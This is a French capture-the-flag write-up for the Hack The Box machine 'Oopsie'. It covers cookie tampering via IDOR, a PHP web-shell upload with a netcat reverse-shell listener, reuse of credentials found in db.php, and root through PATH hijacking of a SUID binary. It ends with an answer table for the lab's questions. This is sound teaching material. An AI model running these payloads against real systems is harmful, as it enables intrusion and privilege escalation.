---
title: Oopsie
description: WU Oopsie
categories: [Writeup]
tags: [writeup]
template: doc
sidebar:
  order: 1
  badge:
    text: 'very easy'
    variant: success
---

| OS | Difficulty | Target |
|----|----|----|
| Linux | <span style="color:green">**VERY EASY**</span> | 10.129.95.191 |

## Résumé

Cette machine exploite une vulnérabilité IDOR (Insecure Direct Object Reference) pour usurper un compte admin, puis un upload de fichier malveillant pour obtenir un accès initial. L'escalade de privilèges se fait via PATH hijacking sur un binaire SUID.

## Flags

| Type | Emplacement |
|------|-------------|
| User | `/home/robert/user.txt` |
| Root | `/root/root.txt` |

---

## Reconnaissance

### Connexion VPN

```bash
htb  # Script personnel pour lancer OpenVPN
ping 10.129.95.191
```

### Interception du trafic web

Utilisation d'un **proxy** (Caido) pour intercepter et analyser le trafic HTTP.

### Découverte de la page de login

En naviguant sur le site ou via l'analyse du code source, on découvre :

```
/cdn-cgi/login/
```

Cette page présente un formulaire de connexion.

---

## Accès initial

### Bypass de l'authentification via IDOR

Après connexion avec des credentials trouvés (ou guest), on accède au panel. La page d'upload est restreinte aux admins.

En analysant les requêtes avec Caido, on remarque que l'accès est contrôlé par un **cookie** contenant un `user` et un `role`.

1. **Trouver l'Access ID de l'admin** : En naviguant vers la page "Accounts" et en modifiant le paramètre `id` dans l'URL, on peut énumérer les utilisateurs :

```
/cdn-cgi/login/admin.php?content=accounts&id=1
```

L'**Access ID de l'admin** est `34322`.

2. **Modifier le cookie** dans Firefox (F12 → Storage → Cookies) :
   - `user` = `34322`
   - `role` = `admin`

On a maintenant accès à la page d'upload.

### Upload d'un reverse shell

1. Créer un reverse shell PHP :

```php
<?php system($_GET['cmd']); ?>
```

Ou utiliser un reverse shell complet (pentestmonkey).

2. Uploader le fichier. Il apparaît dans le répertoire :

```
/uploads/
```

3. Déclencher le reverse shell :

```bash
nc -lvnp 4444
```

Accéder à `http://10.129.95.191/uploads/shell.php?cmd=...` avec une commande reverse shell.

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo && fg
```

### User flag

Le flag utilisateur est lisible directement par www-data :

```bash
cat /home/robert/user.txt
# ********************************
```

---

## Mouvement latéral

### Découverte de credentials

Exploration des fichiers de l'application web :

```bash
ls /var/www/html/cdn-cgi/login/
# admin.php  db.php  index.php  script.js

cat /var/www/html/cdn-cgi/login/db.php
```

```php
<?php
$conn = mysqli_connect('localhost','robert','**REDACTED**','garage');
?>
```

**Credentials trouvés** : `robert:**REDACTED**`

### Connexion SSH

```bash
ssh robert@10.129.95.191
# Password: **REDACTED**
```

---

## Escalade de privilèges

### Énumération des fichiers SUID

Recherche de fichiers appartenant au groupe `bugtracker` :

```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker
```

Vérification des permissions :

```bash
ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Le binaire est **SUID root** (`s` dans les permissions). Peu importe quel utilisateur l'exécute, il tourne avec les privilèges **root**.

> **SUID** = **Set User ID** - Le processus s'exécute avec les privilèges du propriétaire du fichier.

### Analyse du binaire

```shell wrap
/usr/bin/bugtracker
# ------------------
# : EV Bug Tracker :
# ------------------
# Provide Bug ID: 12
# ---------------
# cat: /root/reports/12: No such file or directory
```

Le binaire appelle `cat` **sans chemin absolu** pour lire des fichiers dans `/root/reports/`. C'est une vulnérabilité de PATH hijacking.

### PATH hijacking

1. **Modifier le PATH** pour inclure notre répertoire en premier :

```bash
export PATH=/home/robert:$PATH
```

2. **Créer un faux `cat`** qui sera exécuté à la place de `/bin/cat` :

```bash
echo '#!/bin/bash' > /home/robert/cat
echo '/bin/cat /root/root.txt' >> /home/robert/cat
chmod +x /home/robert/cat
```

> **Important** : Le shebang `#!/bin/bash` est obligatoire, sinon le script ne s'exécute pas avec les privilèges SUID.

3. **Exécuter le binaire vulnérable** :

```shell wrap
/usr/bin/bugtracker
# ------------------
# : EV Bug Tracker :
# ------------------
# Provide Bug ID: 44
# ---------------
# ********************************
```

### Alternative : Obtenir un shell root

Pour obtenir un shell interactif root plutôt que juste lire le flag :

```bash
echo '#!/bin/bash' > /home/robert/cat
echo '/bin/bash -p' >> /home/robert/cat
chmod +x /home/robert/cat
/usr/bin/bugtracker
```

Le flag `-p` préserve les privilèges effectifs (EUID root).

---

## A retenir

1. **IDOR (Insecure Direct Object Reference)** : Toujours vérifier si les ID utilisateur peuvent être énumérés/modifiés.

2. **Cookies manipulables** : Les contrôles d'accès côté client (cookies) sont facilement contournables.

3. **Credentials hardcodés** : Les fichiers de configuration des applications web contiennent souvent des credentials en clair.

4. **Réutilisation de mots de passe** : Le mot de passe de la base de données était aussi le mot de passe SSH de robert.

5. **PATH Hijacking** : Les binaires SUID qui appellent des commandes sans chemin absolu sont vulnérables. Toujours utiliser des chemins absolus (`/bin/cat` au lieu de `cat`).

6. **Shebang obligatoire** : Pour qu'un script s'exécute correctement via un binaire SUID, il doit avoir un shebang valide.

7. **Hash du shell bash** : Bash met en cache l'emplacement des commandes. Utiliser `hash -r` ou `hash -d <cmd>` pour vider le cache après modification du PATH.

---

## Réponses aux questions HTB

| # | Question | Réponse |
|---|----------|---------|
| 1 | Tool to intercept web traffic | `proxy` |
| 2 | Path to login page | `/cdn-cgi/login` |
| 3 | What can be modified in Firefox for upload access | `cookie` |
| 4 | Access ID of admin user | `34322` |
| 5 | Upload directory | `/uploads` |
| 6 | File with robert's password | `db.php` |
| 7 | Command with -group bugtracker | `find` |
| 8 | User privileges for bugtracker | `root` |
| 9 | SUID stands for | `Set User ID` |
| 10 | Insecurely called executable | `cat` |
